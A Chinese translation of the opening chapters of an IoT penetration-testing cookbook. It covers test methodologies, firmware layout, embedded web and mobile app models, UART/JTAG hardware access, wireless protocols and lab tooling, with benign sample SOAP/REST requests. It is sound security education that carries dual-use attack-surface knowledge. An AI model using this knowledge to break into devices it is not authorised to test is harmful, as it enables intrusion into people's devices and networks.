# IOT 渗透测试秘籍（一）

> 原文：[`annas-archive.org/md5/897C0CA0A546B8446493C0D8A8275EBA`](https://annas-archive.org/md5/897C0CA0A546B8446493C0D8A8275EBA)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

物联网是一个术语，用于指代连接到网络的嵌入式设备。一些设备被改装以包括连接它们到网络的模块，而其他一些是为特定需求而创建的尖端设备。在每种情况下，这些设备都对企业、国家和个人的安全构成风险。无论您是新手渗透测试人员还是经验丰富的渗透测试人员，《物联网渗透测试食谱》都包含了帮助安全专业人员全面评估和保护物联网生态系统的食谱。

# 本书所需的内容

以下是本书的软件要求：

+   Microsoft 威胁建模工具 2016

+   Binwalk，Firmadyne，Firmwalker，Angr（可选），Firmware-mod-toolkit，固件分析工具包，GDB，Radare2（可选），**二进制分析工具**（**BAT**），Qemu，IDA Pro（可选）

+   Burp Suite，OWASP ZAP

+   移动安全框架（MobSF），Idb，SQLite 浏览器 3.10.1，Cydia，openURL，dumpdecrypted，ipainstaller，SSL Kill Switch 2，Clutch2，Cycript，JD-GUI，Hopper

+   RTL-SDR

+   **Node 安全项目**（**Nsp**），Retirejs，Dependency-check，flawfinder，Jenkins 2.60.3

以下是本书的硬件要求：

+   Attify Badge（或者，C232HM-DDHSL-0 电缆和 Adafruit FTDI Breakout 的组合），Salae Logic Sniffer（8 通道），RzRaven USB Stick 刷上 KillerBee 框架，JTAGulator，带有 Xbee Shield 的 Xbee，Ubertooth，BLE 适配器

# 本书的受众

本书适用于希望熟悉发现和利用物联网系统中的漏洞的软件开发人员、质量保证专业人员和安全专业人员，以及那些有兴趣采用积极的防御性安全控制的人员。

# 章节

在本书中，您将经常看到几个标题（准备好了，如何做...，它是如何工作的...，还有更多...，以及另请参阅）。为了清晰地说明如何完成食谱，我们使用以下部分：

# 准备好了

本节告诉您在食谱中可以期待什么，并描述了为食谱设置任何软件或任何先决设置所需的步骤。

# 如何做...

本节包含了遵循食谱所需的步骤。

# 它是如何工作的...

本节通常包括对上一节中发生的事情的详细解释。

# 还有更多...

本节包括有关食谱的其他信息，以使读者更加了解食谱。

# 另请参阅

本节提供了其他有用信息的链接。

# 约定

在本书中，您将找到许多文本样式，用于区分不同类型的信息。以下是一些这些样式的示例及其含义的解释。文本中的代码词，数据库表名，文件夹名，文件名，文件扩展名，路径名，虚拟 URL，用户输入和 Twitter 句柄显示如下：

“如果我们通过双击打开`preferences`文件，我们将看到存储在未受保护存储中的 OAuth `access_tokens` 和 `refresh_tokens` （`CVE-2017-6082`）。”

代码块设置如下：

```
<Contextpath="/jira"docBase="${catalina.home}
/atlassian- jira" reloadable="false" useHttpOnly="true">
```

任何命令行输入或输出都以以下方式编写：

```
adb pull data/data/com.skybell.app/files/default.realm /path/to/store/realdb
```

**新术语**和**重要单词**以粗体显示。您在屏幕上看到的单词，例如菜单或对话框中的单词，会以这样的方式出现在文本中：“单击 查看类转储 以列出应用程序的类详细信息。”

警告或重要说明会以这种方式出现。

提示和技巧会以这种方式出现。


# 第一章：IoT 渗透测试

尽管**IoT**这个术语据信是由麻省理工学院的 Auto-ID 实验室于 1999 年创造的，嵌入式设备在技术领域已经存在了几十年。新 IoT 和嵌入式设备世界之间的区别在于设计决策和配置的遗留问题，这些决策和配置从未打算公开在互联网上。由于制造公司没有考虑后果，目前正在发生对 IoT 设备的广泛利用，导致了有史以来一些最大的**分布式拒绝服务**（**DDoS**）攻击。我们将涵盖 IoT 渗透测试的各个方面和实际的安全指导，以提供针对当前市场上出现的攻击的预防措施。

要了解 IoT 的起源，您可以访问此链接：

[`autoid.mit.edu/iot_research_initiative`](http://autoid.mit.edu/iot_research_initiative)

有关上述 DDoS 攻击的详细信息可以通过以下链接找到：[`www.us-cert.gov/ncas/alerts/TA16-288A`](https://www.us-cert.gov/ncas/alerts/TA16-288A)

在本章中，我们将涵盖以下主题：

+   定义 IoT 生态系统和渗透测试生命周期

+   固件 101

+   IoT 中的 Web 应用程序

+   IoT 中的移动应用程序

+   设备基础知识

+   IoT 无线通信简介

+   建立 IoT 渗透测试实验室

本章的目标是为 IoT 渗透测试奠定基础，然后将在接下来的章节中使用。

# 介绍

本章重点介绍进行 IoT 渗透测试时所需的基础知识。它提供了关于 IoT 内部许多攻击面的基本概念，并为协助测试人员启动 IoT 测试实验室奠定了基础。

我们将讨论当前 IoT 渗透测试的状态以及可能的攻击面的每个领域，以解决测试在多年来的进展。然后我们将介绍固件安全、Web 应用程序安全、移动应用程序安全、硬件安全和无线通信的基础知识。

最后，我们将指导您如何设置所需的软件工具和硬件工具进行测试。

# 定义 IoT 生态系统和渗透测试生命周期

在过去几年中，由于部署的设备数量庞大、提供的便利性、易用性以及它们在我们社会中可能带来的潜在安全风险，人们对 IoT 设备格外关注。随着 IoT 的蓬勃发展，我们作为一个社会正逐渐接近技术的奇点。对 IoT 和支撑它们的互联网的依赖引发了对安全、隐私和安全性的担忧。由于设备渗透到消费者、娱乐、商业、医疗、工业、能源和制造等所有行业领域，已经证明消费者以及商业技术运营商和所有者无法适当地确保这些设备的安全。依赖设备制造商提供适当保证，即设备采用诸如安全设计等方法，严重依赖于设备所属的行业。

每个行业垂直领域和地区都有各自的测试设备法规。在测试之前进行尽职调查以确保不违反法律非常重要。在一些地区，如美国，对消费者设备进行安全研究是允许的，并且不受**数字千禧年版权法**（**DMCA**）的限制，只要研究是出于善意，合法获取的，是在受控环境中进行的，并且不违反 2016 年 10 月的**计算机欺诈和滥用法**（**CFAA**）。这意味着对连接的车辆、摄像头、各种智能家居设备、视频游戏主机和越狱移动设备进行安全研究现在是合法的。经过与 DMCA 和安全社区的长期斗争，这是一个重大胜利。

现在这些法律已经通过，这就是我们介入的地方；我们将进行设备固件、Web 应用程序、移动应用程序、硬件和无线通信的评估。首先，我们需要了解物联网的全部范围，包括渗透测试方法和生命周期，以识别所有的攻击面。让我们讨论每个物联网组件的基础知识，以便了解攻击。

# 渗透测试方法

对应用程序、网络和设备进行安全漏洞测试对于保持互联网更安全更重要。无论是由制造商、第三方咨询公司、企业安全团队还是安全研究人员进行测试，方法都会根据测试人员获得的信息而有所不同。理想情况下，全面的测试应该包括整个物联网系统及其基础设施，而不仅仅是设备本身，但由于价格或技术能力的原因，测试通常只包括物联网系统的一个子集也是常见的。

# 黑盒

黑盒评估是常见的，通常以相对较低的成本进行。这些类型的评估是在没有关于所使用的技术或设备实施的先验知识的情况下进行的。往往情况下，黑盒评估是由安全研究人员或第三方咨询公司进行的，但也可以由内部安全团队进行风险评估。

负责任的披露说明

如果通过安全研究发现了漏洞，重要的是要遵循供应商网站上的披露政策。如果供应商没有披露政策，CERT 可以协助适当地披露所报告的漏洞。有关 CERT 的漏洞披露政策的详细信息，请访问[`www.cert.org/vulnerability-analysis/vul-disclosure.cfm?`](http://www.cert.org/vulnerability-analysis/vul-disclosure.cfm?)。

# 白盒

白盒评估是指测试人员被允许完全访问源代码、网络图、架构图、数据流图以及目标设备所使用的其他详细信息。通常情况下，测试人员事先获得的目标设备或应用程序的信息越多，测试结果就会越好。白盒评估成本更高，但也确保了对设备安全控制及其实施的更彻底审查。

# 灰盒

灰盒评估是在测试人员有限或部分了解的情况下进行的，组织内部人员知道这些情况。这些评估可能包括测试人员只知道应用程序堆栈和所使用的库，但没有关于 API 的详细文档。

有关安全研究的数字千年版权法（DMCA）的更多信息，请访问以下链接：[`www.ftc.gov/news-events/blogs/techftc/2016/10/dmca-security-research-exemption-consumer-devices`](https://www.ftc.gov/news-events/blogs/techftc/2016/10/dmca-security-research-exemption-consumer-devices)。

# 固件 101

固件是一种写入硬件设备以控制用户应用程序和各种系统功能的软件。固件包含低级编程代码，使软件能够访问硬件功能。运行固件的设备被称为嵌入式系统，其硬件资源有限，例如存储能力和内存。运行固件的嵌入式设备的例子包括智能手机、交通信号灯、连接的车辆、某些类型的计算机、无人机和有线机顶盒。

显然，嵌入式技术和运行在这些设备上的固件控制着我们的日常生活，从城市依赖的关键基础设施，到银行 ATM 和消费者居住的住宅。了解固件二进制文件的组成及其相关属性是很重要的。固件由引导加载程序、内核、文件系统和各种其他资源组成。在嵌入式 Linux、嵌入式 Windows、Windows IoT 核心和各种**实时操作系统**（**RTOS**）上构建了不同类型的固件。本书将针对嵌入式 Linux 环境，但原则将保持平台无关。

您可以在此链接了解更多关于固件的信息：

[`wiki.debian.org/Firmware`](https://wiki.debian.org/Firmware)

以下图表代表了固件包含的内容：闪存内容、引导加载程序、内核和根文件系统：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/231e28db-2fd3-4dce-8a9b-da4d56f020f0.png)

图 1.1：固件内容

# 深入研究固件

让我们首先看看引导加载程序。引导加载程序的责任是初始化 RAM 以用于易失性数据存储，初始化串行端口，检测机器类型，设置内核标记列表，加载`initramfs`（初始 RAM 文件系统）并调用内核映像。引导加载程序通过**板支持包**（**BSP**）初始化硬件驱动程序，通常由第三方开发。引导加载程序位于单独的**可擦写可编程只读存储器**（**EEPROM**）上，这种情况较少见，或直接位于闪存存储器上，这种情况较常见。可以将引导加载程序视为 PC 启动时的 BIOS。详细讨论每个引导加载程序的责任超出了本书的范围；但是，我们将强调引导加载程序如何对我们有利。一些常见的 ARM 和 MIPS 架构引导加载程序包括：Redboot、u-boot 和 barebox。一旦引导加载程序启动内核，文件系统就会被加载。

固件中使用了许多文件系统类型，有时甚至会根据设备使用专有文件类型。然而，一些最常见的文件系统类型是 SquashFS、cramFS、JFFS2、YAFFS2 和 ext2。在设备中（尤其是消费者设备）使用最广泛的文件系统是 SquashFS。有一些实用工具，如`unsquashfs`和修改后的`unsquashfs`，用于从压缩的文件系统中提取数据。当供应商更改 SquashFS 以使用不受支持的压缩（例如 LZMA，SquashFS 4.0 之前，唯一官方支持的压缩是`.zlib`）时，将使用修改后的`unsquashfs`工具，并且文件系统的起始偏移量将与常规 SquashFS 文件系统不同。我们将在本书的后面部分讨论定位和识别偏移量。

有关嵌入式 Linux 文件系统的更多阅读，请访问以下链接：[`elinux.org/images/b/b1/Filesystems-for-embedded-linux.pdf`](http://elinux.org/images/b/b1/Filesystems-for-embedded-linux.pdf)。

Sasquatch 是一个方便的工具，可用于提取修改后的 SquashFS 文件系统。Sasquash 可以在以下链接找到：

[`github.com/devttys0/sasquatch`](https://github.com/devttys0/sasquatch)

同样，固件图像使用许多类型的文件压缩，例如 LZMA、`.gzip`、`.zip`、`.zlip`和`.arj`等。每种压缩方式都有其优缺点，如压缩后的大小、压缩时间、解压时间，以及设备本身的业务需求。对于我们的目的，我们将把文件系统视为包含配置文件、服务、帐户密码、哈希和应用代码以及启动脚本的位置。在下一章中，我们将指导您如何找到正在使用的文件系统以及正在使用的压缩方式。

# 固件的开发供应链

在文件系统中，特定设备的代码存放在 C、C++或其他编程语言（如 Lua）中。特定设备的代码，甚至整个固件本身，可以是第三方开发者承包的，称为原始设计制造商（ODM），或者是与原始设备制造商（OEM）合作的内部开发者编写的。ODM 是嵌入式设备开发供应链中的重要组成部分。它们通常是亚洲的小公司，数量众多。一些 OEM 与他们信任的 ODM 合作生产产品线，而另一些则会与只有一个产品的 ODM 合作，费用最低。根据行业的不同，ODM 也可以被称为供应商。需要注意的是，ODM 可以自由地与许多不同的 OEM 合作，甚至可以分发相同的代码库。您可能对这个概念很熟悉，甚至想知道为什么一个关键的公共警告会影响十多个设备制造商的软件漏洞。这是由于 ODM 缺乏安全的开发生命周期流程，以及 OEM 的验证不足。一旦 ODM 完成他们的应用程序交付物，可能是 SDK 或固件，交付给 OEM，OEM 将把自己的代码库合并到固件中，这可能只是在 Web 界面上放置 OEM 标志。实施方式取决于 ODM 和 OEM 如何合并他们的代码；然而，ODM 向 OEM 提供二进制文件并不罕见。OEM 负责分发固件，管理固件，并支持设备本身。这包括第三方研究人员报告的固件安全问题，如果 ODM 保留源代码，而 OEM 只能访问二进制映像，这会给 OEM 带来压力。

在第三章中，《分析和利用固件》，我们将学习如何通过识别文件系统、识别压缩和模拟二进制文件进行测试，来逆向工程固件二进制映像，以利用常见的固件问题。

# 物联网中的网络应用程序

网站，又称为网络应用程序，无需介绍。至少，网络应用程序包含前端 HTML，JavaScript，后端 Web 服务器，应用服务器和数据库。随着网络应用程序的发展，对前端代码（如 JavaScript）的重度依赖越来越多，以便将计算负载从后端基础设施或设备上卸载。在更大范围的互联网上，网络应用程序与通过嵌入式设备提供的网络应用程序略有不同。

您所熟悉的网络应用程序有更多的依赖项，包括分离的 Web 服务器、应用服务器、数据库服务器，以及在后端运行的微服务。分离每个服务器是出于性能和可用性的原因。传统上，嵌入式网络应用程序被设计为在其自包含的环境中运行。从广义上讲，对于嵌入式网络应用程序，性能和可用性的关注较少。

今天在物联网领域使用的 Web 应用程序有两种不同的模型，例如混合云模型和嵌入式服务器独立模型。混合模型是供应商或制造商提供**软件即服务**（**SaaS**）Web 应用程序，并连接到运行在固件上的嵌入式设备的 Web 应用程序的混合。然后，数据从制造商的云与设备上的设备在设备的本地网络上同步。对于一些物联网设备，会利用物联网云服务提供商的 SDK，例如 AWS 的物联网 SDK 和 Azure 的物联网 SDK，并内置到设备的 Web 应用程序堆栈中。识别混合模型对于遵守公司的服务条款以及您所在地区的法律范围非常重要。许多利用混合模型的物联网公司通常使用第三方软件开发公司或 ODM 代表 OEM 托管其 Web 应用程序。这些 ODM 的 Web 应用程序通常会为特定的 OEM 产品重新打包，而在没有代理通信的情况下可能不会被注意到。

具有互联网功能的物联网设备的混合云模型可能如下图所示。用户访问设备的界面，供应商的云和用户设备之间的 Web 服务在幕后进行更改或收集数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0286ac63-5107-4f15-b80c-56ea86df7a88.png)

图 1.2 混合 Web 模型

嵌入式设备 Web 应用程序，正如前面提到的，是在设备固件内部运行的，利用嵌入式 Web 服务器，如 lighttpd 或 nginx，没有外部依赖。您可能熟悉这些独立的嵌入式 Web 应用程序，它们通常在打印机、VoIP 电话和家用路由器上运行。很多时候，输入直接发送到设备固件，如果用户输入未经验证或未经过滤，攻击者可以在设备的上下文中执行任意命令。在某些情况下，嵌入式 Web 应用程序设计为仅在**局域网**（**LAN**）内运行，以防止外部攻击或用于管理目的。这可能适用于家庭物联网、工业和商业设备。通常，仅在局域网内可用的设备是出于安全目的，但正如我们所了解的，这并不能阻止攻击。有意设计产品以此为目的的设备制造商正在意识到，客户有意或无意地将其设备连接到互联网，从而对客户网络构成风险。

以下图示演示了用户通过 Web 浏览器连接到嵌入式独立 Web 应用程序，而无需外部系统依赖：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/48003667-51ba-4c99-a652-f1467989b9a2.png)

图 1.3：本地嵌入式 Web 应用程序

# Web 通信

浏览器、嵌入式服务器和 Web 应用程序服务器之间的通信通常通过 Web 服务进行，例如**简单对象访问协议**（**SOAP**）/ XML 或基于**表述状态转移**（**REST**）的 API，通过 HTTP/HTTPS 进行。SOAP 请求包括一个信封元素，一个`xmlns:soap`命名空间，一个`encodingStyle`属性，以及诸如 SOAP 主体元素之类的各种元素。有关 SOAP 的更多详细信息，请访问以下链接：

[`www.w3schools.com/xml/xml_soap.asp`](https://www.w3schools.com/xml/xml_soap.asp)。

一个查询账户余额的`HTTP SOAP`请求示例如下所示：

```
POST http://example.com/soap/webservices HTTP/1.1 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Authorization: BasicYWRtaW46YWRtaW4= 
Content-Length: 821 
Content-Type: text/plain;charset=UTF-8 
DNT: 1 
Connection: keep-alive 
Host: example.com 

<soapenv:Envelope  > 
   <soapenv:Header/> 
   <soapenv:Body> 
      <getAccountBalance> 
         <messageHeader> 
            <action>get</v1:action> 
            <scopeObject>AccountBalance</v1:scopeObject> 
            <revision>1.0</v1:revision> 
           <createdTimestamp>2017-01-13T09:15:01.469</v1:createdTimestamp> 
            <sourceInterface>WEB</v1:sourceInterface> 
            <messageIdentifier>00810187-101EDDA4</v1:messageIdentifier> 
            <functionName>getAccountBalance</v1:functionName> 
         </messageHeader> 
         <billingAccountIdentifier>1234566</v1:billingAccountIdentifier> 
      </getAccountBalance> 
   </soapenv:Body> 
</soapenv:Envelope> 
```

REST 风格的 API 利用各种 HTTP 方法，这些方法在传统的 Web 应用程序中可能不是标准的，例如 PUT 方法，用于更新资源值，以及`DELETE`方法，用于在 API 中删除值。REST 请求可以通过 URL 进行参数调用（不建议用于敏感数据），也可以通过**JavaScript 对象表示**（**JSON**）中的 HTTP 主体进行调用。

一个订阅`test@example.com`电子邮件地址到电子邮件分发列表的 REST 请求示例如下所示：

```
POST /rest/email/subscribe HTTP/1.0 
Host: example.com 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Content-Type: application/json 
Content-Length: 160 
Connection: close 

{ 
  "subscriberId":"12345", 
  "emailAdress":"test@example.com", 
  "confirmed":"Y" 
} 
```

为了查看 SOAP 或 REST 请求，需要使用中间人代理。诸如 Burp Suite 和/或 OWASP ZAP 之类的工具被用作 Web 代理，以查看从浏览器和移动应用程序到应用程序的 Web 后端基础设施发出的所有请求。我们将在第四章中后面的设置配置来代理应用程序流量。

就物联网而言，Web 应用程序是控制设备的常见方式，也是内部和外部网络角度的攻击入口之一。在第四章中，《嵌入式 Web 应用程序的利用》，我们将学习如何识别常见的物联网 Web 应用程序缺陷和漏洞。

# 物联网中的移动应用程序

在物联网领域，移动应用程序与先前讨论的 Web 应用程序模型类似。虽然讨论移动设备平台的安全模型的具体细节超出了本书的范围，但对移动应用程序开发模型有基本的了解将有助于在前进时进行测试。

# 混合

安装在 Android、iOS 或 Windows 手机设备上的移动应用程序可以是混合应用程序或本机应用程序。虽然混合和本机这两个术语在移动应用程序的意义上与 Web 应用程序有所不同，但原则是相似的。混合应用程序利用 Web 技术（如 HTML/HTML 5、CSS 和 JavaScript）以及一些本机平台硬件（如 GPS 或蓝牙）。对硬件资源的访问仅通过混合框架提供的插件。将混合应用程序视为打包到本机平台可以使用的包装器中的 Web 应用程序。这意味着 Web 开发人员现在可以编写移动应用程序，而无需学习新语言。

混合应用程序为多个平台使用一个代码库，例如 Windows Phone、Android 和 iOS，这在考虑首次推出物联网设备时是一个巨大的优势。应用程序通过嵌入的 Web 浏览器（称为 WebView）在 Web 上调用。市场上有许多混合框架，如 Apache Cordova、Adobe PhoneGap 和 Xamarin 等，这些都是目前最受欢迎的应用程序使用的框架。

每个移动混合框架都包含一个第三方市场，其中包含各种功能的插件。一些框架，如 Xamarin，是用一种编程语言（C#）编写的，并被翻译成本机语言（Objective C 和 Java）以实现快速开发。这些移动框架已知存在许多安全警报，从本机平台上的关键远程代码执行问题到隐私问题。如果您注意到某个特定的移动混合框架正在被使用，那么查看漏洞数据库可能是一个不错的主意。

为了让您更好地了解运行混合应用程序所需的架构，以下图表显示了应用程序代码、WebViews、插件和移动设备本身之间的不同组件。请记住，大多数包装器代码和插件是由混合框架或为框架做出贡献的第三方开发人员开发的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d240b6b2-0fc4-4b23-b849-336bdec75509.png)

混合应用程序示例

# 本机应用程序

本机应用是为特定操作系统构建的，并在设备平台的本机语言内编写，例如 Java、Objective C、Swift，甚至 Windows 手机的 C#。本机应用使用各自平台的 SDK，使应用程序可以访问摄像头、蓝牙和 GPS 等硬件。本机应用的性能和安全性更好，但依赖于懂得本机语言的经验丰富的开发人员。在某些情况下，这可能对开发人员的人员配备造成困难，因为平台 API 经常更新和废弃语言类或方法。越来越多的平台，如 iOS 和 Android，正在开发本机安全 API，开发人员可以利用这些 API，而无需使用第三方库。这对于安全通信和安全数据存储非常重要。

本机架构比混合应用架构简单得多。以下图表显示了本机应用在设备上直接运行本机代码，无需第三方组件来访问硬件资源：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5732b5bd-04fc-4f7c-851f-d30a85dff090.png)

本机应用示例

了解每种移动应用模型的优缺点对于有效的测试非常重要。由于设备控制被委托给移动应用程序，它们是设备的另一个攻击入口点，有时比其他入口点更容易。在第五章中，*对物联网移动应用程序的利用*，我们将深入研究物联网移动应用程序中一些最常见的漏洞，同时剖析物联网设备。

# 设备基础

设备硬件从**印刷电路板**（**PCB**）开始，由玻璃纤维、铜、焊膜、丝印、走线和焊盘组成。电阻、电容、Wi-Fi 芯片、EEPROM 和串行和微控制器等组件被焊接到 PCB 上。PCB 有各种薄铜箔层，使其导电，也有绝缘层，使其不导电。在查看 PCB 时，识别感兴趣的组件非常重要。感兴趣的组件包括直接或间接成为设备固件输入源的组件。EEPROM、NAND 闪存、**通用异步收发器**（**UART**）和**联合测试行动组**（**JTAG**）等组件是测试的重点。

这是**数字视频录像机**（**DVR**）的 PCB 板的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3f9d66c9-5f98-47b4-badd-596f944b93f7.jpg)

PCB 板

# 硬件输入

EEPROM 是一种非易失性存储位置，可以按字节单块读写。EEPROM 可以通过电荷或紫外线曝光来擦除。与其他闪存类型类似，EEPROM 允许有限次数的写入循环。EEPROM 是一个值得关注的芯片，因为固件可以加载到 EEPROM 上，并且可以从 PCB 上移除到 EEPROM 读卡器进行进一步分析：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5cfe5ed0-19cc-44fb-b30c-d4da33185751.jpg)

EEPROM

图片来源：[`cdn.sparkfun.com//assets/parts/3/0/5/EEPROM.jpg`](https://cdn.sparkfun.com//assets/parts/3/0/5/EEPROM.jpg)

NAND 闪存存储器以块的形式写入和读取，通常在 USB 驱动器中找到，但也存在于物联网设备以及游戏机中。NAND 闪存通常包含设备的引导加载程序，遵循各种指令启动操作系统，并且可以被操纵；我们将在本书的后面为您详细介绍这一点。

UART 是获得设备访问权限的最常见方式之一。制造商使用 UART 进行诊断、日志消息，并作为验证配置的调试控制台，这使得它成为固件中最常见的输入源之一。由于它用于调试，一旦连接，通常会授予 root 访问权限。然而，有时 UART 访问受到密码保护，这可能会增加暴力破解的时间。UART 包含大约八条数据线和控制引脚，还有两根串行线，即接收数据和发送数据线（RX/TX）。UART 不需要外部时钟。在 PCB 上连接到 UART 时，必须使用万用表找到 TX、RX 和 GND。有时，在某些设备上找到 UART 可能比其他设备更困难。一些制造商可能会从 PCB 上移除 UART 引脚，需要进行焊接。制造商还可能用各种丝网层覆盖 UART 引脚，并用另一个集成电路覆盖引脚，这可能有点麻烦。

JTAG 是 IEEE 1149.1 下的另一种串行通信。它是为芯片和系统级测试而创建的。制造商使用 JTAG 作为调试的来源，类似于 UART。有能力保护 JTAG 访问的密码，但 BYPASS 模式仍然应该有效。固件可以通过 JTAG 进行转储以进行分析或升级。它提供了与板上硬件的直接接口，这意味着它可以访问连接到它的设备，如闪存或 RAM。有 TDI（数据输入）、TDO（数据输出）、TMS（测试模式选择）、TCK（测试时钟）和 TRST（测试复位）。JTAG 连接到芯片上的测试访问端口（TAP），在访问芯片上的寄存器时调节状态。与 UART 类似，制造商可能会混淆引脚或迹线。

查看 PCB 并在物联网设备中找到组件，可以通过拆卸设备或搜索第三方网站如[`fccid.io`](https://fccid.io)。 FCC ID 是由 FCC 分配的产品 ID，以便跟踪市场上的无线产品。 Fccid.io 非常棒，为我们提供了大量关于设备的详细信息！ FCC 发布各种设计文件、数据表、内部图像、外部图像、测试报告、各种手册、无线频率等。在第六章中，《物联网设备黑客入门》，我们将带您了解硬件黑客的方法论，以定位硬件细节并连接输入。

# 物联网无线通信简介

物联网设备最常见的连接和交互方式是通过无线射频（RF）通信。在当今市场上使用了许多不同的无线频率、调制和协议。一些无线协议是专有的，而其他一些是标准的。打开设备将揭示一个或多个执行无线通信的芯片。这对于需要接收各种不同无线通信协议和频率的物联网网关和中心非常常见。无线技术的优势之一是能够远程控制设备。这也是利用具有无线通信的设备时的情况。重要的是要了解每种无线技术的距离能力。一个无线协议可能有 105 英尺（约 32 米）的距离，而另一些可能只有 20 厘米。在物联网生态系统中有许多无线协议，其中一些最常用的协议包括 Wi-Fi（802.11）、ZigBee（802.15.4）、Z-Wave、蓝牙（802.15.1）和蓝牙低功耗。

# Wi-Fi

**Wi-Fi**是多年来许多设备中使用的最常见的无线技术。它在 2.4 GHz 和 5 GHz ISM 频段上运行。目前有许多正在使用的 Wi-Fi 标准，如 802.11a、802.11b、802.11g、802.11n 和 802.11ac。802.11b 和 802.11g 在 2.4 GHz 频段上运行，而 802.11a、802.11n 和 802.11ac 使用 5 GHz 频段。有 14 个无线信道，它们在不同的频率上运行。根据地区，Wi-Fi 路由器可以在特定信道上进行广播。

# ZigBee

**ZigBee**基于 IEEE 802.15.4 规范，支持低功率无线网状网络的物理和媒体访问控制层。ZigBee 根据地区在不同的 ISM 频段上运行，但在全球范围内主要在 2.4 GHz 上运行，美国为 915 MHz，欧盟为 868 MHz。ZigBee 由协调器（ZC）、路由器（ZR）和终端设备（ZED）组成。协调器自动启动网络的形成。网络中只有一个协调器，通常是用于验证和验证加入网络的每个设备的信任中心，并具有唯一的网络密钥。路由器从其他设备传递数据，并将路由关联到终端设备。

路由器必须持续供电，以便正确地将消息传递到网络。终端设备是物联网设备，如开关、传感器、摄像头或监视器。它们无法在网络内路由数据，但可以在不传输数据时进入低功耗模式。ZigBee 网络基于两个安全密钥，即网络密钥和链接密钥。网络密钥用于安全传输通信，是一个与网络中所有设备共享的 128 位密钥。链接密钥用于安全地传输 ZigBee 应用层中的单播通信。链接密钥也是一个 128 位密钥，仅在两个设备之间共享。链接密钥可以预先安装在设备上，也可以通过密钥交换进行分发。在设备配对期间的易受攻击的密钥交换是消费者级 ZigBee 网络中已知的缺陷，这使得攻击者可以窃听交换网络密钥并破坏整个网络。

关于 ZigBee 安全漏洞的良好幻灯片可以通过 2015 年在 Blackhat 上举行的*ZIGBEE EXPLOITED*演讲找到。

[`www.blackhat.com/docs/us-15/materials/us-15-Zillner-ZigBee-Exploited-The-Good-The-Bad-And-The-Ugly-wp.pdf`](https://www.blackhat.com/docs/us-15/materials/us-15-Zillner-ZigBee-Exploited-The-Good-The-Bad-And-The-Ugly-wp.pdf)。

# Z-Wave

**Z-Wave**是另一种低功率无线通信协议，支持主从模式的网状网络。它使用不同地区的次 1 GHz 频段（美国为 916 MHz，欧盟为 868.42 MHz）。其物理和媒体访问层在 ITU 下被批准为国际标准 G.9959。两个设备之间的 Z-Wave 范围为 328 英尺或 100 米，但当流量通过其网状网络中的 Z-Wave 产品时，可以达到 600 英尺或 200 米。Z-Wave 网络由 4 字节（32 位）的 HomeID 标识，这是控制器或主节点的唯一 ID。同一网络中的所有节点共享相同的 HomeID。每个节点由 1 字节（8 位）的 NodeID 标识，这是控制器在加入网络后提供的。具有不同 HomeID 的节点无法相互通信。Z-Wave 可以使用 AES 加密，由 Z-Wave 中心支持，但对于制造商来说，这纯粹是可选的。Z-Wave 确实包括一个很好的信号干扰检测功能，可以防止**拒绝服务**（**DoS**）攻击。

有关 Z-Wave 协议的其他规格，请访问[`www.z-wave.com`](http://www.z-wave.com)。

# 蓝牙

**蓝牙**是一种常用的无线技术标准（IEEE 802.15.1），用于短距离数据通信。蓝牙在 2.4 至 2.485 GHz 广播，最远可达 100 米，但更常用于 10 米或 30 英尺以下。本书将包含蓝牙和**蓝牙低功耗**（**BLE**）测试技术，因为许多物联网设备确实使用了蓝牙作为主要通信手段。有关蓝牙的更多阅读，请访问以下链接：

[`www.bluetooth.com/what-is-bluetooth-technology/how-it-works`](https://www.bluetooth.com/what-is-bluetooth-technology/how-it-works)

# 设置物联网渗透测试实验室

现在，所有基础物联网技术都已涵盖，让我们开始设置物联网渗透测试实验室。由于物联网设备采用了一套技术，因此需要软件和硬件测试的多种工具。我们将使用一些付费商业工具以及免费工具。硬件和无线电分析工具需要一些前期购买。Web 应用程序代理工具需要适度的许可费，但我们将尽量保持价格低廉，并在可能的情况下提供免费工具。

# 软件工具要求

软件工具将涵盖固件、Web 应用程序和移动应用程序测试工具。这三类测试工具中的大多数都是免费的，除了 Web 应用程序测试的 Burp Suite。为了方便起见，已经花费时间在本书的虚拟机中设置和安装了大部分固件分析、Web 测试、移动测试（有限）和无线电分析的软件工具。但是，已经编制了所有工具的清单，并在此记录。

# 固件软件工具

幸运的是，大多数固件分析工具都是免费且开源的。一些工具正在积极更新，而其他一些可能已经过时但仍然有效。以下是一些可以分析固件图像、反汇编图像并在运行时连接到固件进程的固件软件工具：

+   Binwalk

+   Firmadyne

+   Firmwalker

+   Angr

+   固件修改工具包

+   固件分析工具包

+   GDB

+   Radare2

+   **二进制分析工具**（**BAT**）

+   Qemu

+   IDA Pro（可选）

# Web 应用软件工具

对于 Web 应用程序测试，最常用的工具是 Burp Suite 和 OWASP **Zed Attack Proxy**（**ZAP**）。Burp Suite 有免费和专业版本可供选择。ZAP 完全免费且开源，可能是保持成本低的一个好选择。可以使用附加插件或附加组件来帮助进行 Web 服务和 API 测试。不幸的是，要在 Burp Suite 中安装插件，需要专业许可证。这里列出的所有工具都是跨平台的，因为它们要么是基于 Java 的，要么是在您的浏览器中：

+   Burp Suite

+   OWASP **Zed Attack Proxy**（**ZAP**）

+   REST Easy Firefox 插件

+   Postman Chrome 扩展程序

# 移动应用软件工具

